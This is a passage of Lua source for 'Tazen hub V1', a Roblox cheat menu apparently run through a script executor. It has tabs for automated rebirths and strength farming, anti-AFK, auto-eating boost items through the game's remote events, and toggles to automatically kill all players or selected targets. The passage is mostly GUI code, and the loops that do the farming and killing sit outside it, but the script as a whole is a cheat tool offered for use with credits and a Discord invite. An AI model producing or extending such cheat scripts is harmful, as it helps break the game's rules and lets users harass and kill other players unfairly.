    TextSize = 34,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextTransparency = 0.84,
    Text = "T",
    LayoutOrder = 1,
    ZIndex = 4,
}, tazenBrandBox)

new("TextLabel", {
    Size = UDim2.fromOffset(32, 45),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    TextSize = 34,
    TextColor3 = T.Accent,
    TextTransparency = 0.84,
    Text = "Λ",
    LayoutOrder = 2,
    ZIndex = 4,
}, tazenBrandBox)

new("TextLabel", {
    Size = UDim2.fromOffset(110, 45),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    TextSize = 34,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextTransparency = 0.84,
    Text = "ZEN",
    LayoutOrder = 3,
    ZIndex = 4,
}, tazenBrandBox)

local topbar = new("Frame", {
    Name = "Topbar",
    Size = UDim2.new(1, 0, 0, 28),
    BackgroundColor3 = T.Topbar,
    BorderSizePixel = 0,
    ZIndex = 6,
}, main)

textLabel({
    Size = UDim2.new(1, -70, 1, 0),
    Position = UDim2.new(0, 10, 0, 0),
    Text = "Tazen hub V1  |  by TZ_THR",
    Font = Enum.Font.GothamBold,
    TextSize = 11,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    ZIndex = 7,
}, topbar)

local function topButton(text, xOffset)
    local b = new("TextButton", {
        Size = UDim2.fromOffset(18, 18),
        Position = UDim2.new(1, xOffset, 0, 5),
        BackgroundColor3 = Color3.fromRGB(0, 0, 0),
        BackgroundTransparency = 0.3,
        Text = text,
        Font = Enum.Font.GothamBold,
        TextSize = 10,
        TextColor3 = T.Text,
        BorderSizePixel = 0,
        ZIndex = 8,
    }, topbar)
    corner(b, 4)
    return b
end

local closeBtn = topButton("X", -22)
local minBtn = topButton("-", -44)

do
    local dragging, dragStart, startPos = false, nil, nil
    connect(topbar.InputBegan, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = main.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    connect(UserInputService.InputChanged, function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch) then
            local d = input.Position - dragStart
            main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

local tabBar = new("Frame", {
    Name = "TabBar",
    Size = UDim2.new(1, -16, 0, 26),
    Position = UDim2.new(0, 8, 0, 34),
    BackgroundColor3 = Color3.fromRGB(20, 20, 20),
    BorderSizePixel = 0,
    ZIndex = 6,
}, main)
corner(tabBar, 4)
new("UIListLayout", {
    FillDirection = Enum.FillDirection.Horizontal,
    Padding = UDim.new(0, 4),
    SortOrder = Enum.SortOrder.LayoutOrder,
}, tabBar)
new("UIPadding", { PaddingLeft = UDim.new(0, 4), PaddingTop = UDim.new(0, 3) }, tabBar)

local pagesHolder = new("Frame", {
    Name = "Pages",
    Size = UDim2.new(1, 0, 1, -66),
    Position = UDim2.new(0, 0, 0, 64),
    BackgroundTransparency = 1,
    ZIndex = 5,
}, main)

local tabs = {}
local tabCount = 0

local function selectTab(name)
    for tabName, t in pairs(tabs) do
        local on = (tabName == name)
        t.page.Visible = on
        t.button.BackgroundColor3 = on and T.Accent or T.Element
        t.button.TextColor3 = on and Color3.fromRGB(15, 15, 15) or T.Text
    end
end

local function createTab(name, width)
    tabCount = tabCount + 1
    local button = new("TextButton", {
        Size = UDim2.fromOffset(width or 85, 20),
        BackgroundColor3 = T.Element,
        Text = name,
        Font = Enum.Font.GothamBold,
        TextSize = 10,
        TextColor3 = T.Text,
        BorderSizePixel = 0,
        LayoutOrder = tabCount,
        ZIndex = 6,
    }, tabBar)
    corner(button, 4)

    local page = new("ScrollingFrame", {
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        ScrollBarThickness = 3,
        ScrollBarImageColor3 = T.Accent,
        CanvasSize = UDim2.new(0, 0, 0, 0),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        Visible = false,
        ZIndex = 6,
    }, pagesHolder)
    new("UIListLayout", { Padding = UDim.new(0, 6), SortOrder = Enum.SortOrder.LayoutOrder }, page)
    new("UIPadding", {
        PaddingTop = UDim.new(0, 6), PaddingLeft = UDim.new(0, 12),
        PaddingRight = UDim.new(0, 16), PaddingBottom = UDim.new(0, 10),
    }, page)

    tabs[name] = { button = button, page = page }
    button.Activated:Connect(function() selectTab(name) end)
    return page
end

local function addSection(page, text)
    textLabel({
        Size = UDim2.new(1, 0, 0, 20),
        Text = text,
        Font = Enum.Font.GothamBold,
        TextSize = 12,
        TextColor3 = T.Accent,
        ZIndex = 6,
    }, page)
end

local function addLabel(page, text, height)
    local f = new("Frame", {
        Size = UDim2.new(1, 0, 0, height or 36),
        BackgroundColor3 = T.Element,
        BorderSizePixel = 0,
        ZIndex = 6,
    }, page)
    corner(f, 4)
    local l = textLabel({
        Size = UDim2.new(1, -16, 1, 0),
        Position = UDim2.new(0, 8, 0, 0),
        Text = text,
        TextSize = 12,
        TextColor3 = T.SubText,
        TextWrapped = true,
        ZIndex = 7,
    }, f)
    return { SetText = function(_, t) l.Text = t end }
end

local function addToggle(page, name, defaultState, callback)
    local initialState = defaultState
    local f = new("Frame", {
        Size = UDim2.new(1, 0, 0, 36),
        BackgroundColor3 = T.Element,
        BorderSizePixel = 0,
        ZIndex = 6,
    }, page)
    corner(f, 4)

    textLabel({
        Size = UDim2.new(1, -60, 1, 0),
        Position = UDim2.new(0, 8, 0, 0),
        Text = name,
        TextSize = 12,
        ZIndex = 7,
    }, f)

    local sw = new("Frame", {
        Size = UDim2.fromOffset(36, 18),
        Position = UDim2.new(1, -44, 0.5, -9),
        BackgroundColor3 = initialState and T.Accent or T.Off,
        BorderSizePixel = 0,
        ZIndex = 7,
    }, f)
    corner(sw, 9)
    local knob = new("Frame", {
        Size = UDim2.fromOffset(14, 14),
        Position = initialState and UDim2.fromOffset(20, 2) or UDim2.fromOffset(2, 2),
        BackgroundColor3 = Color3.new(1, 1, 1),
        BorderSizePixel = 0,
        ZIndex = 8,
    }, sw)
    corner(knob, 7)

    local hit = new("TextButton", { Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Text = "", ZIndex = 9 }, f)

    local obj = { Value = initialState }
    function obj:Set(v, noSave)
        if v == self.Value and not noSave then return end
        self.Value = v
        local info = TweenInfo.new(0.15, Enum.EasingStyle.Quad)
        TweenService:Create(knob, info, { Position = v and UDim2.fromOffset(20, 2) or UDim2.fromOffset(2, 2) }):Play()
        TweenService:Create(sw, info, { BackgroundColor3 = v and T.Accent or T.Off }):Play()
        if callback then callback(v) end
    end

    hit.Activated:Connect(function() obj:Set(not obj.Value) end)
    return obj
end

local function addSavedToggle(page, name, categoryKey, settingKey, defaultState, callback)
    local configData = loadCategoryConfig(categoryKey)
    local initialState = defaultState
    if configData[settingKey] ~= nil then initialState = configData[settingKey] end

    local f = new("Frame", {
        Size = UDim2.new(1, 0, 0, 36),
        BackgroundColor3 = T.Element,
        BorderSizePixel = 0,
        ZIndex = 6,
    }, page)
    corner(f, 4)

    textLabel({
        Size = UDim2.new(1, -60, 1, 0),
        Position = UDim2.new(0, 8, 0, 0),
        Text = name,
        TextSize = 12,
        ZIndex = 7,
    }, f)

    local sw = new("Frame", {
        Size = UDim2.fromOffset(36, 18),
        Position = UDim2.new(1, -44, 0.5, -9),
        BackgroundColor3 = initialState and T.Accent or T.Off,
        BorderSizePixel = 0,
        ZIndex = 7,
    }, f)
    corner(sw, 9)
    local knob = new("Frame", {
        Size = UDim2.fromOffset(14, 14),
        Position = initialState and UDim2.fromOffset(20, 2) or UDim2.fromOffset(2, 2),
        BackgroundColor3 = Color3.new(1, 1, 1),
        BorderSizePixel = 0,
        ZIndex = 8,
    }, sw)
    corner(knob, 7)

    local hit = new("TextButton", { Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Text = "", ZIndex = 9 }, f)

    local obj = { Value = initialState }
    function obj:Set(v, noSave)
        if v == self.Value and not noSave then return end
        self.Value = v
        local info = TweenInfo.new(0.15, Enum.EasingStyle.Quad)
        TweenService:Create(knob, info, { Position = v and UDim2.fromOffset(20, 2) or UDim2.fromOffset(2, 2) }):Play()
        TweenService:Create(sw, info, { BackgroundColor3 = v and T.Accent or T.Off }):Play()
        
        if not noSave then
            local currentConfig = loadCategoryConfig(categoryKey)
            currentConfig[settingKey] = v
            saveCategoryConfig(categoryKey, currentConfig)
        end
        if callback then callback(v) end
    end

    hit.Activated:Connect(function() obj:Set(not obj.Value) end)
    return obj
end

local repSliderUpdateFunc = function() end

local function addSlider(page, name, min, max, default, callback)
    local initialVal = default
    local f = new("Frame", {
        Size = UDim2.new(1, 0, 0, 52),
        BackgroundColor3 = T.Element,
        BorderSizePixel = 0,
        ZIndex = 6,
    }, page)
    corner(f, 4)

    textLabel({ Size = UDim2.new(1, -80, 0, 20), Position = UDim2.new(0, 8, 0, 6), Text = name, TextSize = 12, ZIndex = 7 }, f)
    local valueLabel = textLabel({
        Size = UDim2.fromOffset(70, 20),
        Position = UDim2.new(1, -78, 0, 6),
        Text = tostring(initialVal),
        TextXAlignment = Enum.TextXAlignment.Right,
        TextColor3 = T.Accent,
        Font = Enum.Font.GothamBold,
        TextSize = 12,
        ZIndex = 7,
    }, f)

    local track = new("Frame", {
        Size = UDim2.new(1, -16, 0, 6),
        Position = UDim2.new(0, 8, 0, 34),
        BackgroundColor3 = T.Off,
        BorderSizePixel = 0,
        ZIndex = 7,
    }, f)
    corner(track, 3)
    local fill = new("Frame", {
        Size = UDim2.new((initialVal - min) / (max - min), 0, 1, 0),
        BackgroundColor3 = T.Accent,
        BorderSizePixel = 0,
        ZIndex = 8,
    }, track)
    corner(fill, 3)

    local hit = new("TextButton", {
        Size = UDim2.new(1, -8, 0, 24),
        Position = UDim2.new(0, 4, 0, 28),
        BackgroundTransparency = 1,
        Text = "",
        ZIndex = 9,
    }, f)

    local function setValue(val)
        val = math.clamp(val, min, max)
        fill.Size = UDim2.new((val - min) / (max - min), 0, 1, 0)
        valueLabel.Text = tostring(val)
        callback(val)
    end

    local dragging = false
    local function update(x)
        local rel = math.clamp((x - track.AbsolutePosition.X) / math.max(track.AbsoluteSize.X, 1), 0, 1)
        local value = math.floor(min + rel * (max - min) + 0.5)
        setValue(value)
    end

    hit.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            page.ScrollingEnabled = false
            update(input.Position.X)
        end
    end)
    connect(UserInputService.InputChanged, function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch) then
            update(input.Position.X)
        end
    end)
    connect(UserInputService.InputEnded, function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch) then
            dragging = false
            page.ScrollingEnabled = true
        end
    end)

    return setValue
end

local function notify(title, text)
    if not alive then return end
    pcall(function()
        local n = new("Frame", {
            Size = UDim2.fromOffset(230, 48),
            Position = UDim2.new(1, 20, 1, -64),
            BackgroundColor3 = T.Element,
            BorderSizePixel = 0,
            ZIndex = 10,
        }, gui)
        corner(n, 6)
        stroke(n, T.Stroke, 1)
        textLabel({
            Size = UDim2.new(1, -12, 0, 18), Position = UDim2.new(0, 8, 0, 4),
            Text = title, Font = Enum.Font.GothamBold, TextSize = 12, TextColor3 = T.Accent, ZIndex = 11,
        }, n)
        textLabel({
            Size = UDim2.new(1, -12, 0, 18), Position = UDim2.new(0, 8, 0, 22),
            Text = text, TextSize = 11, TextColor3 = T.SubText, ZIndex = 11,
        }, n)
        local info = TweenInfo.new(0.25, Enum.EasingStyle.Quad)
        TweenService:Create(n, info, { Position = UDim2.new(1, -250, 1, -64) }):Play()
        task.delay(2.5, function()
            if n and n.Parent then
                TweenService:Create(n, info, { Position = UDim2.new(1, 20, 1, -64) }):Play()
                task.wait(0.3)
                n:Destroy()
            end
        end)
    end)
end

local TAB_FAST = E.bolt .. " Fast Rebirth"
local TAB_AUTO = E.cycle .. " Auto Rebirth"
local TAB_STR = E.muscle .. " Fast Strength"
local TAB_KILL = E.sword .. " Killing"
local TAB_MISC = E.toolbox .. " Misc"
local TAB_INFO = E.info .. " Infos"

local fastPage = createTab(TAB_FAST, 95)
local autoPage = createTab(TAB_AUTO, 95)
local strPage = createTab(TAB_STR, 95)
local killPage = createTab(TAB_KILL, 65)
local miscPage = createTab(TAB_MISC, 55)
local infoPage = createTab(TAB_INFO, 55)

local fastToggle, autoToggle, repToggle, equipWeightToggle, equipPushupToggle, killAllToggle, killTargetToggle, antiAfkToggle, antiLagToggle, autoWheelToggle, autoEggToggle, hidePetsToggle, hidePopupsToggle, autoSaveConfigToggle, autoWhitelistToggle

local function notifyState(title, v)
    notify(title, v and (E.ok .. " Enabled") or (E.no .. " Disabled"))
end

-- Fast Rebirth
addSection(fastPage, E.fire .. " Fast Rebirth (Pack)")
addLabel(fastPage, "⚠️ You need pack for fast rebirth", 32)
fastToggle = addToggle(fastPage, E.bolt .. " Fast Rebirth", false, function(v)
    fastRunId = fastRunId + 1
    if v then
        fastStartTime = tick()
        StatTracker.reset("rebirths")
        autoRunId = autoRunId + 1
        if autoToggle then autoToggle:Set(false) end
        notifyState(E.bolt .. " Fast Rebirth", true)
        task.spawn(fastRebirthLoop, fastRunId)
    else
        fastStartTime = nil
        notifyState(E.bolt .. " Fast Rebirth", false)
    end
end)

equipWeightToggle = addSavedToggle(fastPage, E.wrench .. " Equip Weight", "RebirthTab", "EquipWeight", false, function(v)
    if v then
        equipToolByName("weight")
        notify("Equip", E.ok .. " Weight equipped")
    end
end)

local fastTimerLabel = addLabel(fastPage, E.clock .. " Session Time: 0s | Last Rebirth : --", 34)
local fastCalcLabel = addLabel(fastPage, E.chart .. " Tot: 0 | 1m: 0 | 1h: 0 | 1d: 0 | 1w: 0 | 1mo: 0", 50)

-- Auto Rebirth
addSection(autoPage, E.cycle .. " Auto Rebirth (No Pack)")
addLabel(autoPage, "⚠️ This tab can be used by everyone", 32)
autoToggle = addToggle(autoPage, E.cycle .. " Auto Rebirth", false, function(v)
    autoRunId = autoRunId + 1
    if v then
        autoStartTime = tick()
        StatTracker.reset("rebirths")
        fastRunId = fastRunId + 1
        if fastToggle then fastToggle:Set(false) end
        notifyState(E.cycle .. " Auto Rebirth", true)
        task.spawn(autoRebirthLoop, autoRunId)
    else
        autoStartTime = nil
        notifyState(E.cycle .. " Auto Rebirth", false)
    end
end)

equipPushupToggle = addSavedToggle(autoPage, E.wrench .. " Equip Pushup", "RebirthTab", "EquipPushup", false, function(v)
    if v then
        equipToolByName("pushup")
        notify("Equip", E.ok .. " Pushup equipped")
    end
end)

local autoTimerLabel = addLabel(autoPage, E.clock .. " Session Time: 0s | Last Rebirth : --", 34)
local autoCalcLabel = addLabel(autoPage, E.chart .. " Tot: 0 | 1m: 0 | 1h: 0 | 1d: 0 | 1w: 0 | 1mo: 0", 50)

-- Fast Strength & Durability
addSection(strPage, E.muscle .. " Fast Strength & Durability")
repToggle = addToggle(strPage, E.muscle .. " Fast Strength", false, function(v)
    repRunId = repRunId + 1
    if v then
        repStartTime = tick()
        repTotal = 0
        StatTracker.reset("strength")
        StatTracker.reset("durability")
        notify(E.muscle .. " Fast Strength", E.target .. " " .. repRate .. " reps/s targeted")
        task.spawn(fastRepLoop, repRunId)
    else
        repStartTime = nil
        notifyState(E.muscle .. " Fast Strength", false)
    end
end)

repSliderUpdateFunc = addSlider(strPage, E.wrench .. " Reps per second", 0, REP_CAP, math.min(repRate, REP_CAP), function(v) repRate = math.min(v, REP_CAP) end)
local repTimerLabel = addLabel(strPage, E.clock .. " Session Time: 0s | Avg Reps/s: 0", 34)
local repCalcLabel = addLabel(strPage, E.muscle .. " Strength Tot: 0 | 1m: 0 | 1h: 0 | 1d: 0 | 1w: 0 | 1mo: 0", 50)
local durabilityCalcLabel = addLabel(strPage, E.shieldAlt .. " Durability Tot: 0 | 1m: 0 | 1h: 0 | 1d: 0 | 1w: 0 | 1mo: 0", 50)

-- Killing Tab
addSection(killPage, E.sword .. " Killing")
killAllToggle = addSavedToggle(killPage, E.sword .. " Auto Kill All Players", "Killing", "AutoKillAll", false, function(v)
    killRunId = killRunId + 1
    if v then
        if killTargetToggle and killTargetToggle.Value then killTargetToggle:Set(false) end
        notifyState("Auto Kill All", true)
        task.spawn(autoKillAllLoop, killRunId)
    else
        notifyState("Auto Kill All", false)
    end
end)

killTargetToggle = addSavedToggle(killPage, E.target .. " Kill Target Players Only", "Killing", "KillTarget", false, function(v)
    killRunId = killRunId + 1
    if v then
        if killAllToggle and killAllToggle.Value then killAllToggle:Set(false) end
        notifyState("Kill Target Only", true)
        task.spawn(killTargetPlayerLoop, killRunId)
    else
        notifyState("Kill Target Only", false)
    end
end)

task.spawn(function()
    task.wait(2)
    if not alive then return end
    if killAllToggle.Value then
        killAllToggle:Set(true, true)
    elseif killTargetToggle.Value then
        killTargetToggle:Set(true, true)
    end
end)

local killStatusLabel = addLabel(killPage, E.clip .. " " .. killStatus, 36)

addSection(killPage, E.shield .. " White List")
autoWhitelistToggle = addToggle(killPage, E.heart .. " Auto White List Friends", false, function(v)
    if v then
        local count = 0
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr:IsFriendsWith(LocalPlayer.UserId) then
                whitelistPlayers[plr.Name] = true
                count = count + 1
            end
        end
        notify("Whitelist", E.ok .. " " .. count .. " friend(s) whitelisted automatically!")
    else
        notify("Whitelist", E.no .. " Auto-whitelist turned off")
    end
end)

addSection(killPage, E.crosshairs .. " Players")
local playerListContainer = new("ScrollingFrame", {
    Size = UDim2.new(1, 0, 0, 140),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    ScrollBarThickness = 3,
    ScrollBarImageColor3 = T.Accent,
    CanvasSize = UDim2.new(0, 0, 0, 0),
    AutomaticCanvasSize = Enum.AutomaticSize.Y,
    ZIndex = 6,
}, killPage)
new("UIListLayout", { Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder }, playerListContainer)

local playerRows = {}

local function removePlayerRow(plr)
    local entry = playerRows[plr]
    if entry then
        pcall(function() entry.row:Destroy() end)
        playerRows[plr] = nil
    end
end

local function addPlayerRow(plr)
    local row = new("Frame", {
        Size = UDim2.new(1, -4, 0, 32),
        BackgroundColor3 = T.Element,
        BorderSizePixel = 0,
        ZIndex = 6,
    }, playerListContainer)
    corner(row, 4)

    textLabel({
        Size = UDim2.new(0.38, 0, 1, 0),
        Position = UDim2.new(0, 8, 0, 0),
        Text = plr.Name,
        TextSize = 11,
        TextColor3 = T.Text,
        ZIndex = 7,
    }, row)

    local wBtn = new("TextButton", {
        Size = UDim2.fromOffset(55, 22),
        Position = UDim2.new(0.42, 0, 0.5, -11),
        BackgroundColor3 = whitelistPlayers[plr.Name] and T.Accent or T.Off,
        Text = "Safe",
        Font = Enum.Font.GothamBold,
        TextSize = 10,
        TextColor3 = T.Text,
        BorderSizePixel = 0,
        ZIndex = 7,
    }, row)
    corner(wBtn, 4)

    local tBtn = new("TextButton", {
        Size = UDim2.fromOffset(55, 22),
        Position = UDim2.new(0.72, 0, 0.5, -11),
        BackgroundColor3 = targetPlayers[plr.Name] and Color3.fromRGB(220, 50, 50) or T.Off,
        Text = "Target",
        Font = Enum.Font.GothamBold,
        TextSize = 10,
        TextColor3 = T.Text,
        BorderSizePixel = 0,
        ZIndex = 7,
    }, row)
    corner(tBtn, 4)

    local function sync()
        local wc = whitelistPlayers[plr.Name] and T.Accent or T.Off
        if wBtn.BackgroundColor3 ~= wc then wBtn.BackgroundColor3 = wc end
        local tc = targetPlayers[plr.Name] and Color3.fromRGB(220, 50, 50) or T.Off
        if tBtn.BackgroundColor3 ~= tc then tBtn.BackgroundColor3 = tc end
    end

    wBtn.Activated:Connect(function()
        whitelistPlayers[plr.Name] = not whitelistPlayers[plr.Name]
        sync()
        notify("Whitelist", plr.Name .. (whitelistPlayers[plr.Name] and " protected." or " removed."))
    end)

    tBtn.Activated:Connect(function()
        targetPlayers[plr.Name] = not targetPlayers[plr.Name]
        sync()
        notify("Target", plr.Name .. (targetPlayers[plr.Name] and " targeted!" or " removed."))
    end)

    playerRows[plr] = { row = row, sync = sync }
end

local function refreshPlayerListUI()
    pcall(function()
        for plr in pairs(playerRows) do
            if not plr.Parent then removePlayerRow(plr) end
        end
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and not playerRows[plr] then
                addPlayerRow(plr)
            end
        end
        for _, entry in pairs(playerRows) do entry.sync() end
    end)
end

task.spawn(function()
    while alive do
        task.wait(2)
        refreshPlayerListUI()
    end
end)

connect(Players.PlayerAdded, refreshPlayerListUI)
connect(Players.PlayerRemoving, removePlayerRow)
task.spawn(refreshPlayerListUI)

-- Misc Tab
addSection(miscPage, E.toolbox .. " Utilities")
antiAfkToggle = addToggle(miscPage, E.sleep .. " Anti AFK", false, function(v)
    setAntiAfk(v)
    notifyState(E.sleep .. " Anti AFK", v)
end)

antiLagToggle = addToggle(miscPage, E.rocket .. " Anti Lag", false, function(v)
    if v then antiLagStart() else antiLagStop() end
    notifyState(E.rocket .. " Anti Lag", v)
end)

autoWheelToggle = addToggle(miscPage, E.wheel .. " Auto Wheel", false, function(v)
    wheelRunId = wheelRunId + 1
    if v then
        notifyState(E.wheel .. " Auto Wheel", true)
        task.spawn(autoWheelLoop, wheelRunId)
    else
        notifyState(E.wheel .. " Auto Wheel", false)
    end
end)

hidePetsToggle = addSavedToggle(miscPage, E.sparkles .. " Hide Pets", "MiscTab", "HidePets", false, function(v)
    setHidePets(v)
    notifyState("Hide Pets", v)
end)

hidePopupsToggle = addSavedToggle(miscPage, E.clip .. " Hide Popups", "MiscTab", "HidePopups", false, function(v)
    setHidePopups(v)
    notifyState("Hide Popups", v)
end)

autoSaveConfigToggle = addSavedToggle(miscPage, E.wrench .. " Save Config", "MiscTab", "AutoSaveConfig", true, function(v)
    notify("Config", v and (E.ok .. " Auto-save enabled") or (E.no .. " Auto-save disabled"))
end)

-- ===================== AUTO EAT PROTEIN EGG =====================
local eggEaten = 0
local eggLabel

local function eggTools()
    local found = {}
    local lists = {}
    if LocalPlayer.Character then lists[#lists + 1] = LocalPlayer.Character end
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if bp then lists[#lists + 1] = bp end
    for _, c in ipairs(lists) do
        for _, t in ipairs(c:GetChildren()) do
            if t:IsA("Tool") and t.Name:lower():find("egg", 1, true) then
                found[#found + 1] = t
            end
        end
    end
    return found
end

local function findEggTool()
    for _, t in ipairs(eggTools()) do
        if t.Name:lower():find("protein egg", 1, true) then return t end
    end
    return eggTools()[1]
end

local EGG_DURATION = 30 * 60 + 3
local eggNextAt = 0
local eggStatus = "--"

local function eatEgg()
    local tool = findEggTool()
    if not tool then return "none" end
    local rEvents = ReplicatedStorage:FindFirstChild("rEvents")
    local ev = findMuscleEvent(rEvents or ReplicatedStorage)
    if not ev then return "unconfirmed" end

    pcall(function() ev:FireServer("proteinEgg", tool) end)
    return "eaten"
end

local function updateEggLabel()
    if not eggLabel then return end
    local left = eggNextAt - tick()
    local boostTxt = (left > 0) and formatSeconds(left) or "inactive"
    eggLabel:SetText(string.format("%s Eaten: %d | Boost: %s | Last: %s",
        E.egg, eggEaten, boostTxt, eggStatus))
end

local function autoEggLoop(myId)
    local noEgg = 0
    eggNextAt = 0
    eggStatus = "--"
    while eggRunId == myId and alive do
        if tick() >= eggNextAt then
            local ok, res = pcall(eatEgg)
            if (not ok) or res == "none" then
                noEgg = noEgg + 1
                eggStatus = "no egg"
                if noEgg >= 3 then
                    pcall(updateEggLabel)
                    notify(E.egg .. " Protein Egg", "No Protein Egg left in inventory")
                    if autoEggToggle then autoEggToggle:Set(false) end
                    return
                end
            elseif res == "eaten" then
                noEgg = 0
                eggEaten = eggEaten + 1
                eggStatus = "eaten"
                eggNextAt = tick() + EGG_DURATION
                notify(E.egg .. " Protein Egg", "Consumed a Protein Egg")
            end
        end
        pcall(updateEggLabel)
        task.wait(1)
    end
end

autoEggToggle = addToggle(miscPage, E.egg .. " Auto Eat Protein Egg", false, function(v)
    eggRunId = eggRunId + 1
    if v then
        eggEaten = 0
        notifyState(E.egg .. " Auto Eat Protein Egg", true)
        task.spawn(autoEggLoop, eggRunId)
    else
        notifyState(E.egg .. " Auto Eat Protein Egg", false)
    end
end)

eggLabel = addLabel(miscPage, E.egg .. " Eaten: 0 | Boost: -- | Last: --", 32)
local fpsLabel = addLabel(miscPage, E.game .. " FPS: --", 32)

-- Infos Tab
addSection(infoPage, E.sparkles .. " Credits & Info")
addLabel(infoPage, "Roblox Main : TZ_THR\nRoblox Alt : TZ_THRV2", 40)

addSection(infoPage, E.antenna .. " Socials")
addLabel(infoPage, "TikTok : tz_thr\nDiscord : tz_thr", 40)

addSection(infoPage, E.link .. " Discord Server")
local copyDiscordBtn = new("TextButton", {
    Size = UDim2.new(1, 0, 0, 32),
    BackgroundColor3 = T.Accent,
    Text = E.link .. " Copy Discord Link",
    Font = Enum.Font.GothamBold,
    TextSize = 12,
    TextColor3 = Color3.fromRGB(15, 15, 15),
    BorderSizePixel = 0,
    ZIndex = 6,
}, infoPage)
corner(copyDiscordBtn, 4)

copyDiscordBtn.Activated:Connect(function()
    pcall(function()
        if setclipboard then
            setclipboard("https://discord.gg/y779ZnRGnd")
            notify("Discord", E.ok .. " Discord link copied to clipboard!")
        else
            notify("Discord", E.no, " Clipboard not supported by executor")
        end
    end)
end)

selectTab(TAB_FAST)

-- Appliquer les configurations sauvegardées au démarrage
task.spawn(function()
    task.wait(1)
    if hidePetsToggle and hidePetsToggle.Value then setHidePets(true) end
    if hidePopupsToggle and hidePopupsToggle.Value then setHidePopups(true) end
end)

-- ===================== STAT TRACKER =====================
task.spawn(function()
    while alive do
        task.wait(1)
        pcall(function()
            fpsLabel:SetText(E.game .. " FPS: " .. tostring(fpsFrames))
            fpsFrames = 0
            killStatusLabel:SetText(E.clip .. " " .. killStatus)

            local rbNow = tick()
            if fastStartTime then
                fastTimerLabel:SetText(string.format("%s Session Time: %s | Last Rebirth : %s",
                    E.clock, formatSeconds(rbNow - fastStartTime), StatTracker.rebirthGap()))
                fastCalcLabel:SetText(StatTracker.rebirthText(E.chart, rbNow, fastStartTime))
            else
                fastTimerLabel:SetText(E.clock .. " Session Time: 0s | Last Rebirth : --")
                fastCalcLabel:SetText(E.chart .. " Tot: 0 | 1m: 0 | 1h: 0 | 1d: 0 | 1w: 0 | 1mo: 0")
            end

            if autoStartTime then
                autoTimerLabel:SetText(string.format("%s Session Time: %s | Last Rebirth : %s",
                    E.clock, formatSeconds(rbNow - autoStartTime), StatTracker.rebirthGap()))
                autoCalcLabel:SetText(StatTracker.rebirthText(E.chart, rbNow, autoStartTime))
            else
                autoTimerLabel:SetText(E.clock .. " Session Time: 0s | Last Rebirth : --")
                autoCalcLabel:SetText(E.chart .. " Tot: 0 | 1m: 0 | 1h: 0 | 1d: 0 | 1w: 0 | 1mo: 0")
            end

            if repStartTime then
                local elapsed = math.max(1, tick() - repStartTime)
                local avgReps = math.floor(repTotal / elapsed)
                repTimerLabel:SetText(string.format("%s Session Time: %s | Avg Reps/s: %d", E.clock, formatSeconds(elapsed), avgReps))
                
                local now = tick()
                repCalcLabel:SetText(StatTracker.text(E.muscle, "Strength", StatTracker.stats.strength, now, repStartTime))
                durabilityCalcLabel:SetText(StatTracker.text(E.shieldAlt, "Durability", StatTracker.stats.durability, now, repStartTime))
            else
                repTimerLabel:SetText(E.clock .. " Session Time: 0s | Avg Reps/s: 0")
                repCalcLabel:SetText(E.muscle .. " Strength Tot: 0 | 1m: 0 | 1h: 0 | 1d: 0 | 1w: 0 | 1mo: 0")
                durabilityCalcLabel:SetText(E.shieldAlt .. " Durability Tot: 0 | 1m: 0 | 1h: 0 | 1d: 0 | 1w: 0 | 1mo: 0")
            end
        end)
    end
end)

local minimized = false
minBtn.Activated:Connect(function()
    minimized = not minimized
    tabBar.Visible = not minimized
    pagesHolder.Visible = not minimized
    watermark.Visible = not minimized
    TweenService:Create(main, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
        Size = UDim2.fromOffset(W, minimized and 28 or H),
    }):Play()
end)

closeBtn.Activated:Connect(function()
    alive = false
    fastRunId = fastRunId + 1
    autoRunId = autoRunId + 1
    repRunId = repRunId + 1
    wheelRunId = wheelRunId + 1
    eggRunId = eggRunId + 1
    killRunId = killRunId + 1
    setAntiAfk(false)
    if antiLagToggle and antiLagToggle.Value then antiLagStop() end
    for _, c in ipairs(connections) do pcall(function() c:Disconnect() end) end
    gui:Destroy()
end)

connect(UserInputService.InputBegan, function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.K then
        gui.Enabled = not gui.Enabled
    end
end)

end)

if not success then
    warn("[Tazen hub Error] : " .. tostring(err))
end
